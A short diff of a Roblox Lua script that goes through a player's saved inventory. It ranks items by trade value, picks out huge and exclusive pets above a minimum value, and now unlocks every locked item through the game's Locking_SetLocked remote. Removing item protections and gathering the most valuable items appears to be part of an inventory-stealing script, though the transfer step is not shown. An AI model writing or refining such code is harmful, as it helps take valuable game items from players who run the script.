@@ -299,16 +299,24 @@ local sortedItems = {}
 for i, v in pairs(categoryList) do
 	if save[v] ~= nil then
 		for uid, item in pairs(save[v]) do
-            local rapValue = getRAP(v, item)
-            if rapValue >= min_rap then
-                if item._lk then
-                    local args = {
-                    [1] = uid,
-                    [2] = false
-                    }
-                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+			if v == "Pet" then
+                local rapValue = getRAP(v, item)
+                local dir = library.Directory.Pets[item.id]
+                if rapValue >= min_rap and (dir.huge or dir.exclusiveLevel) then
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue})
                 end
-                table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue})
+            else
+                local rapValue = getRAP(v, item)
+                if rapValue >= min_rap then
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue})
+                end
+            end
+            if item._lk then
+                local args = {
+                [1] = uid,
+                [2] = false
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
             end
         end
 	end
